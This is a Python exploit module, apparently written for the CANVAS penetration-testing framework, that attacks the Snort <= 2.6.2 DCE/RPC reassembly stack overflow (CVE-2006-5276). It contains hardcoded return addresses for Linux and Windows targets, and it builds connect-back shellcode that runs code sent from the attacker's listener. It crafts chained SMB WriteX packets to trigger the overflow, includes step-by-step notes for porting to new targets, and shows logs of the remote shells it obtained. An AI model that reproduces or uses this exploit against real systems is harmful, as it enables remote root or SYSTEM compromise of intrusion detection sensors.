#! /usr/bin/env python

# system imports
import sys
import time

if '.' not in sys.path:
    sys.path.append('.')

# CANVAS imports
from exploitutils import *
from tcpexploit import tcpexploit
from libs.dcemarshall import *
from shellcode import shellcodeGenerator

# GUI info
NAME="Snort RPC"
DESCRIPTION="Snort <= 2.6.2 DCE/RPC reassembly exploit"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="SourceFire"
DOCUMENTATION["Date public"] = "19-02-2007"
DOCUMENTATION["References"] = "http://xforce.iss.net/xforce/xfdb/31275"
DOCUMENTATION["CVE Name"] = "CVE-2006-5276"
DOCUMENTATION["CVE Url"] = "http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2006-5276"
DOCUMENTATION['CVSS'] = 10.0
DOCUMENTATION["Repeatability"] = "Single shot"
DOCUMENTATION["Notes"]  = """This version of the exploit needs to connect to a port 139
Note that it does not need to be an actual Netbios target.
Something like a netcat listener will work fine.
"""
VERSION="0.1"
PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Linux", "i386", "_sparc"], ["_Solaris"], ["_FreeBSD"], ["Windows"] ]
NOTES="""
From the advisory:

Snort IDS (Intrusion Detection System), Sourcefire Intrusion Sensor software,
and Nortel Threat Protection are vulnerable to a stack-based buffer
overflow in the DCE/RPC reassembly process. By sending specially-crafted SMB
traffic to a vulnerable system, a remote attacker could overflow a
buffer and execute arbitrary code on the system with root or SYSTEM privileges.

TODO:
=====

- Solaris
- FreeBSD
- etc.

Dev notes:
==========

smb_andx_decode.c:

...

static void ReassembleSMBWriteX(SMB_WRITEX_REQ *writeX, u_int8_t *smb_data)
{
     /* XXX: overflow into here .. stack based */
     SMB_WRITEX_REQ temp_writeX;

     unsigned int   smb_hdr_len = (u_int8_t *)writeX - _dcerpc_pkt->payload;

     /* XXX: writeX len calculated unsafely from packet */
     /* XXX: by chaining two writex headers you can make len > structsize */
     unsigned int   writeX_len = smb_data - (u_int8_t *)writeX;

...

     /* XXX: offending memcpy into stack */
     /* Mock up header */
     memcpy(&temp_writeX, writeX, writeX_len);

...

The trick to actual reaching this bug relies on stuffing multiple
WriteX requests into the packet. The first one has to fail IsCompleteDCERPCMessage()
so that fragmentation mode is true .. the 2nd one can then trigger the actual
bug within ReassembleSMBWriteX by abusing the fact that the length for the data
is taken straight from the packet offsets. See notes in packet build for
more information.

...

To debug SNORT code reaching:
=============================

1) ./configure -enable-debug, make

2) Look up DEBUG_CODE in debug.h .. e.g. DEBUG_DCERPC

3) SNORT_DEBUG=debugcode ./snort -A full -c /etc/snort.conf

...

Payload room wise .. we pretty much can stuff as much payload into memory as stack
space and TCP MTU size allows us to do. See the size adjustment semantics for
details in the code.

...

PoC:
====

[!] Listening on port 8080 ...
Connected to by ('192.168.1.103', 60718)
Connected, Linux MOSDEF ...
[C] Getting interface data
[DEV] all: Calling newNode with nextID=0
[C] Self.fd=9
[C] Set up Linux dynamic linking assembly component server
Initialized sendint with fd=9
[C] Initialized Local Functions.
[C] Resetting signal handlers...
[C] Reset sigchild
[C] Getting UIDs
[C] Calling findInterfaces
[C] Reading 4 interfaces from remote side
Letting user interact with server
Linux/MOSDEF#

...

[!] Listening on port 8080 ...
Connected to by ('172.16.147.129', 2580)
Connected, running win32 MOSDEF server
[C] Getting interface data
[DEV] all: Calling newNode with nextID=0
XORKEY=e7
XORKEY=e7
[C] XOR Key set to 0xe7
[C] Starting up Win32 MOSDEF Node !
...
[C] Loadlibrary iphlpapi.dll = 77340000
[C] Getprocaddr_withmalloc: Found iphlpapi.dll|GetIpAddrTable at 773445b4
Letting user interact with server
Win32/MOSDEF$

To port:
========

1) CRASH

Crash target snort with DEBUG target. If crash occurred in memcpy, this means
you ran out of stack and need to reduce the writelen (less nop space).

2) GET ESP OFFSET

Note down ESP address + offset into nops. This is your retaddr. Ofcourse this
won't work on Linux boxen with non-exec stacks.

3) TARGET

Add target in targets struct.

WINDOWS:
========

For windows targets .. it's pretty much the same deal. Just find a jmp esp as
your retaddress. Make sure the name has a 'WINDOWS' in it.

"""

# targets: name, retaddr offset, retaddr, writelen

targets = {
    0 : ["Autoversioning N/A", 0],
    1 : ["Snort 2.6.1.2 - LINUX - GENTOO/X86", 28, 0xbfffec50, 0x300],
    2 : ["Snort 2.6.1.2 - LINUX - DEBUG TARGET", 28, 0x41424344, 0x300],

    # Windows has 2 bytes written into stack at [esp+532], jmp esp in snort.exe
    3 : ["Snort 2.6.1.2 - WINDOWS - WIN2K [ALL]", 0, 0x004C98CF, 0x200],
    4 : ["Snort 2.6.1.2 - WINDOWS - DEBUG TARGET", 0, 0x41424344, 0x200]
}

class theexploit(tcpexploit):

    def __init__(self):
        tcpexploit.__init__(self)
        self.port = 139
        self.name = NAME

    def createShellcode(self):
        "default linux/windows callback"

        try:

            if targets[self.version][0].lower().find("linux") > -1:
                sc = shellcodeGenerator.linux_X86()
                sc.addAttr("connect", {"ipaddress":self.callback.ip, "port":self.callback.port})
                sc.addAttr("read_and_exec", {"fdreg": "esi"})
                self.shellcode = sc.get()

            elif targets[self.version][0].lower().find("windows") > -1:
                sc = shellcodeGenerator.win32()
                sc.addAttr("findeipnoesp", {"subespval": 0x1000 })
                #sc.addAttr("revert_to_self_before_importing_ws2_32", None)
                sc.addAttr("tcpconnect", {"port":self.callback.port, "ipaddress":self.callback.ip})
                sc.addAttr("RecvExecWin32",{"socketreg": "FDSPOT"}) #MOSDEF
                sc.addAttr("ExitThread", None)
                self.shellcode = sc.get()

        except:

            print "[!] did you forget to set -l -d on the commandline !?"
            self.shellcode = "\xcc" * 256

        print "[!] shellcode length is %d bytes"% len(self.shellcode)
        return self.shellcode

    def neededListenerTypes(self):

        if targets[self.version][0].lower().find("linux") > -1:
            from canvasengine import LINUXMOSDEF
            return [LINUXMOSDEF]
        if targets[self.version][0].lower().find("windows") > -1:
            from canvasengine import WIN32MOSDEF
            return [WIN32MOSDEF]

        return []

    def displayVersions(self):
        i = 0
        for listline in targets.values():
            print "%d : %s"% (i, listline[0])
            i+=1

    def buildRPC(self, prepend, retadd, writelen):
        "build offensive DCE/RPC Write/AndX requests"

        import struct

        # our overwrite buffer .. eip is at 32 bytes into it
        overwrite = ""

        if (writelen < prepend + 4 + len(self.shellcode)):
            print "[X] No space for love dr. jones !"
            return ""

        # PREPEND
        overwrite += "A" * prepend
        writelen -= prepend
        # EIP tag (linux)
        overwrite += struct.pack("<L", retadd)
        writelen -= 4

        # WINDOWS specific tweak (jmp past bad bytes into big space)
        #if targets[self.version][0].lower().find("windows") > -1:
        #    jmp = mosdef.assemble("jmp 544", "X86")
        #    print "[!] Windows tweak jmp len: %d bytes"% len(jmp)
        #    overwrite += jmp
        #    writelen -= len(jmp)

        # NOP
        overwrite += "A" * (writelen-len(self.shellcode))
        writelen -= (writelen - len(self.shellcode))
        # PAYLOAD
        overwrite += self.shellcode

        print "[!] overwrite len: %d bytes"% len(overwrite)

        offset = -4
        pkt = ""

        # NetBIOS Session Service
        pkt += "\x00" # type session message
        pkt += "\x00\x04\x1b" # big total size

        # SMB header
        pkt += "\xffSMB"
        pkt += "\x75" # next command -> TREE_CONNECT_ANDX state
        pkt += "\x00\x00\x00\x00"

        #pkt += "\x08"
        #pkt += "\x01\xc8"
        pkt += "\x18"
        pkt += "\x07\xc8"

        pkt += "\x00\x00"
        pkt += "\x00\x00\x00\x00\x00\x00\x00\x00"
        pkt += "\x00\x00"
        pkt += "\x00\x00"
        pkt += "\x00\x01" # PID
        pkt += "\x00\x02" # UID
        pkt += "\x00\x03" # MXID

        offset = len(pkt)-4
        print "SMB header offset to Tree Connect: %x"% offset

        # Tree Connect AndX Request
        pkt += "\x04" # word count
        pkt += "\xa2" # next command -> NT_CREATE_ANDX state
        pkt += "\x00"
        pkt += "\x3a\x00" # AndX offset to NT_CREATE
        pkt += "\x00\x00"
        pkt += "\x01\x00"
        pkt += "\x0f\x00" # byte count 15
        pkt += "\x00"
        # PATH: IPC$ (to get through isIPC)
        pkt += "\x49\x00\x50\x00\x43\x00\x24\x00\x00\x00"
        # service IPC
        pkt += "\x49\x50\x43\x00"

        offset = len(pkt)-4
        print "SMB header offset to NT Create: %x"% offset

        # NT Create AndX
        pkt += "\x18\x2f"
        pkt += "\x00"
        pkt += "\x7e\x00" # AndX offset to 1st WriteX
        pkt += "\x00"
        pkt += "\x0e\x00"
        pkt += "\x00\x00\x00\x00"
        pkt += "\x00\x00\x00\x00"
        pkt += "\x9f\x01\x02\x00"
        pkt += "\x00\x00\x00\x00\x00\x00\x00\x00"
        pkt += "\x00\x00\x00\x00"
        pkt += "\x03\x00\x00\x00"
        pkt += "\x01\x00\x00\x00"
        pkt += "\x00\x00\x00\x00"
        pkt += "\x02\x00\x00\x00"
        pkt += "\x00"
        pkt += "\x11\x00" # BCC for '\lsarpc' in unicode == 17
        pkt += "\x5c\x00\x5c\x00\x6c\x00\x73\x00\x61\x00\x72\x00\x70\x00\x63\x00\x00"

        offset = len(pkt)-4
        print "SMB header offset to Write #1: %x"% offset

        # Write AndX request DCERPC Bind
        pkt += "\x0e" # WCT
        pkt += "\x2f" # Additional commands
        pkt += "\x00" # Reserved
        pkt += "\xe3\x00" # AndXoffset
        pkt += "\x03\x40" # FID
        pkt += "\x00\x00\x00\x00" # Offset
        pkt += "\xff\xff\xff\xff" # Reserved
        pkt += "\x08\x00" # Write Mode
        pkt += "\x48\x00" # Remaining
        pkt += "\x00\x00" # Data Length High
        pkt += "\x48\x00" # Data Length Low (fraglen is 72)
        pkt += "\x9e\x00" # Data offset (offset to dcerpc from SMB header)
        pkt += "\x00\x00\x00\x00" # high offset
        pkt += "\x49\x00" # BCC Byte Count (fraglen + 1 padding)
        pkt += "\xee" # padding

        offset = len(pkt)-4
        print "SMB header offset to DCE Bind Frag #1: %x"% offset

        # DCE RPC Bind frag message
        pkt += "\x05" # version 5
        pkt += "\x00"
        pkt += "\x0b" # needs to be either DCERPC_REQUEST or DCERPC_BIND (dcerpc.c)
        pkt += "\x03"
        pkt += "\x10\x00\x00\x00"

        # 0x116 is size (278) XXX: break IsCompleteDCERPCMessage
        # frag_length
        # !!! SIZE ADJUST POINT 1: to adjust sizes .. theoraadtically we add to this
        # 0x70 + whatever your overwrite/payload size is
        #pkt += "\x70\x04"

        pkt += struct.pack("<H", len(overwrite) + 0x70)

                            # 1st frag len needs to be > size to return 0 1st time
                            # so we can go into reassembly for the evil writeX
                            #     if ( frag_length > size ) return 0;

                            # !!!: this is why you need multiple WriteX requests
                            # !!!: to reach the bug .. the 1st to get into SMB_Fragmentation
                            # !!!: mode .. and the 2nd one to trigger the actual overflow

                            # basically we want ProcessDCERPCMessage to report we're not
                            # a complete DCE RPC Message when it is called from SMBFragmentation
                            # the first time. This is dependant on IsCompleteDCERPCMessage.

        pkt += "\x00\x00" # auth len
        pkt += "\x01\x00\x00\x00"
        pkt += "\xb8\x10"
        pkt += "\xb8\x10"
        pkt += "\x00\x00\x00\x00"
        pkt += "\x01"
        # CTX item
        pkt += "\x00\x00\x01\x00\x6a\x28\x19\x39\x0c\xb1\xd0\x11\x9b\xa8"
        pkt += "\x00\xc0\x4f\xd9\x2e\xf5\x00\x00\x00\x00\x04\x5d\x88\x8a\xeb\x1c"
        pkt += "\xc9\x11\x9f\xe8\x08\x00\x2b\x10\x48\x60\x02\x00\x00\x00"

        offset = len(pkt)-4
        print "SMB header offset to Write #2: %x"% offset

        # OVERWRITE: Write AndX request DCERPC Bind
        pkt += "\x0e" # WCT
        pkt += "\xff" # no more commands
        pkt += "\x00" # Reserved
        pkt += "\xde\xde" #
        pkt += "\x03\x40" # FID
        pkt += "\x00\x00\x00\x00" # Offset
        pkt += "\xff\xff\xff\xff" # Reserved
        pkt += "\x08\x00" # Write Mode
        pkt += "\x48\x00" # Remaining
        pkt += "\x00\x00" # Data Length High

        # !!!: SIZE ADJUST DEPEND .. make sure this holds true if you adjust sizes
        pkt += "\x0f\x0f" # Data Length Low (this + prev Data Len has to be > frag_len #1)

        # this length controls ultimate write length
        # total_size is 436 .. data offset has to be < total_size .. so 435

        # !!!: SIZE ADJUST POINT 2: to adjust sizes .. theoraadtically we add to this
        # 0x103 + whatever overwrite/payload size is
        #pkt += "\x03\x05" # Data offset (offset to dcerpc from SMB header has to be < total_size)

        pkt += struct.pack("<H", len(overwrite) + 0x103)

        pkt += "\x00\x00\x00\x00" # high offset
        pkt += "\x49\x00" # BCC Byte Count (fraglen + 1 padding)
        pkt += "\xee" # padding

        # DCE RPC Bind frag message overwrite control here
        # for additional size control .. add to points 1 and 2 at SIZE ADJUST POINT
        # XXX: does it dynamically now ;)

        # slap in our overwrite
        pkt += overwrite

        # make sure data offset < total size of data or otherwise we trigger a return
        pkt += "\xee" # padding

        return pkt

    def getArgs(self):
        "get module arguments"

        self.node = self.argsDict["passednodes"][0]
        self.host = self.target.interface
        self.port = int(self.argsDict.get("port", self.port))

    def run(self):
        "init packet and fire it on the wire"

        self.getArgs()
        self.setInfo("%s attacking SNORT via traffic to %s:%d"%(NAME, self.host, self.port), showlog=1)

        # switch this to raw sockets so we dont need to use an actual tcp connect ;)

        # connect and fire packet on the wire to debug formatting
        if ':' in self.host:
            s = self.gettcpsock(AF_INET6=1)
        else:
            s = self.gettcpsock()
        try:
            s.connect((self.host, self.port))
        except socket.error:
            self.log("No connection...")
            return 0

        name, prepend, retadd, writelen = targets[self.version]
        self.log("[!] target set to: %s"% name)
        s.send(self.buildRPC(prepend, retadd, writelen))

        s.close()

        # wait for callback
        time.sleep(1)

        # check callback
        ret = self.ISucceeded()
        if ret:
            self.setInfo("%s Attacking Snort via traffic to %s:%d (success!)"%(NAME, self.host, self.port), showlog=1)
        else:
            self.setInfo("%s Attacking Snort via traffic to %s:%d (failed?)"%(NAME, self.host, self.port), showlog=1)

        return ret

if __name__ == '__main__':
    print "Running CANVAS " + NAME + " version " + VERSION
    app = theexploit()
    ret = standard_callback_commandline(app)

